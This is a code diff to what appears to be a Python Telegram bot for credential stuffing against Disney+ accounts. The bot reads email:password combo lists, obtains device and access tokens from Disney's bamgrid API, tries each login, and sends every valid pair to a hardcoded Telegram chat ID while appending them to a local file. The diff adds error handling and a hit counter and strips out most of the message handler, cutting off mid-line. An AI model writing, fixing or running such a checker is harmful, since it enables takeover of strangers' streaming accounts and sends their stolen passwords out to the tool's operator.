@@ -2,10 +2,9 @@ import requests
 import telebot
 from telebot import types
 
-token = input("Tokem:") 
+token = input("Topen:") 
 CHAT_ID = '5947916142'  
 bot = telebot.TeleBot(token, parse_mode="HTML")
-
 
 def ahmed(file):
     hits = 0
@@ -49,9 +48,16 @@ def ahmed(file):
 
                 s = requests.Session()
 
-                r = s.post('https://global.edge.bamgrid.com/devices', data=data, headers=head).json()['assertion']
+                # Obtener el dispositivo
+                response = s.post('https://global.edge.bamgrid.com/devices', data=data, headers=head).json()
+                if 'assertion' not in response:
+                    print("No assertion in response:", response)
+                    continue
+                assertion = response['assertion']
+
+                # Obtener el token
                 url1 = 'https://global.edge.bamgrid.com/token'
-                data1 = 'grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=' + r + '&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice'
+                data1 = 'grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=' + assertion + '&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice'
                 head1 = {
                     'accept-encoding': 'gzip, deflate, br',
                     'accept-language': 'en-US,en;q=0.9',
@@ -71,8 +77,14 @@ def ahmed(file):
                     'x-bamsdk-platform': 'windows',
                     'x-bamsdk-version': '4.16'
                 }
+                
+                response = s.post(url1, data=data1, headers=head1).json()
+                if 'access_token' not in response:
+                    print("No access token in response:", response)
+                    continue
+                access_token = response['access_token']
 
-                r2 = s.post(url1, data=data1, headers=head1).json()['access_token']
+                # Verificar el email
                 url2 = 'https://global.edge.bamgrid.com/idp/check'
                 data2 = '{"email":"' + email + '"}'
                 head2 = {
@@ -80,7 +92,7 @@ def ahmed(file):
                     'accept': 'application/json; charset=utf-8',
                     'accept-encoding': 'gzip, deflate, br',
                     'accept-language': 'en-US,en;q=0.9',
-                    'authorization': 'Bearer ' + r2 + '',
+                    'authorization': 'Bearer ' + access_token,
                     'cache-control': 'no-cache',
                     'content-length': '34',
                     'content-type': 'application/json; charset=UTF-8',
@@ -100,6 +112,7 @@ def ahmed(file):
                 r3 = s.post(url2, data=data2, headers=head2).text
 
                 if '"operations":["Login","OTP"]' in r3:
+                    # Intentar login
                     url3 = 'https://global.edge.bamgrid.com/idp/login'
                     data3 = '{"email":"' + email + '","password":"' + password + '"}'
                     head3 = {
@@ -107,7 +120,7 @@ def ahmed(file):
                         'accept': 'application/json; charset=utf-8',
                         'accept-encoding': 'gzip, deflate, br',
                         'accept-language': 'en-US,en;q=0.9',
-                        'authorization': 'Bearer ' + r2 + '',
+                        'authorization': 'Bearer ' + access_token,
                         'cache-control': 'no-cache',
                         'content-length': '34',
                         'content-type': 'application/json; charset=UTF-8',
@@ -128,12 +141,12 @@ def ahmed(file):
                         tlg = f'''DISNEY HIT \n  ┌ Correo ⇝{email} \n ├ Contraseña ⇝ {password} | \n BY : @HenrryOfc'''
                         print("\033[32m" + tlg + "\033[0m")
 
-                        
                         bot.send_message(chat_id=CHAT_ID, text=tlg)
 
                         with open('Diszny.txt', 'a') as x:
                             x.write(email + ":" + password + '\n' + tlg)
 
+                        hits += 1
                     elif 'Invalid password' in r4:
                         print("\033[31m" + 'BAD Account >>' + email + "\033[0m")
                         bad += 1
@@ -149,41 +162,11 @@ def ahmed(file):
 
     return hits, bad
 
-
 @bot.message_handler(commands=["start"])
 def start(message):
     bot.reply_to(message, "Enviar solo el archivo con")
 
-
 @bot.message_handler(content_types=["document"])
 def main(message):
     hits, bad = 0, 0
-    ko = bot.reply_to(message, "Checking Your Email...⌛").message_id
-    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
-
-    with open("combo.txt", "wb") as w:
-        w.write(ee)
-
-    try:
-        with open("combo.txt", 'r') as f:
-            lines = f.readlines()
-            total = len(lines)
-            for line in lines:
-                password = line.split(":")[1]
-                email = line.split(":")[0]
-
-                mes = types.InlineKeyboardMarkup(row_width=1)
-                cm1 = types.InlineKeyboardButton(f"• Hits ✅ : [{hits}] •", callback_data='x')
-                cm2 = types.InlineKeyboardButton(f"• Bad ❌ : [ {bad} ] •", callback_data='x')
-                cm5 = types.InlineKeyboardButton(f"• Total : [ {total} ] •", callback_data='x')
-                mes.add(cm1, cm2, cm5)
-                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=''' BY ➜ @HenrryOfc ''', reply_markup=mes)
-
-                hits, bad = ahmed("combo.txt")
-
-    except Exception as e:
-        print("Error:", e)
-
-
-print('Hecho')
-bot.infinity_polling()
+    ko = bot.reply_to(message, "Checking Your Email...⌛").message
